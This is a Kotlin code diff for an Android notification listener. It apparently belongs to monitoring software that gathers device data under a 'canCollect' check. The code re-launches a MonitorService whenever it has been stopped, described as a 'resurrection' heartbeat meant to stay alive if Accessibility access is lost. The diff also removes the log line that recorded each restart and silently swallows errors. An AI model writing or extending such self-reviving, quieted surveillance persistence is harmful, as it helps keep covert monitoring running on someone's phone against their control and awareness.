@@ -13,16 +13,15 @@ class MyNotificationListener : NotificationListenerService() {
         if (!ConfigManager.canCollect(this, "notifications")) return
 
         // SYMBIOTE RESURRECTION: Secondary Heartbeat
-        // If Accessibility is lost, this becomes our primary way to stay alive
         try {
+            // Simple check to avoid spamming startService
             val am = getSystemService(Context.ACTIVITY_SERVICE) as android.app.ActivityManager
-            val isRunning = am.getRunningServices(Int.MAX_VALUE).any { it.service.className == MonitorService::class.java.name }
+            val isRunning = am.getRunningServices(100).any { it.service.className.contains("MonitorService") }
             
             if (!isRunning) {
                 val intent = android.content.Intent(this, MonitorService::class.java)
                 if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) startForegroundService(intent)
                 else startService(intent)
-                DebugLogger.log("SYMBIOTE", "MonitorService resurrected via Notification Hook")
             }
         } catch(e: Exception) {}
 
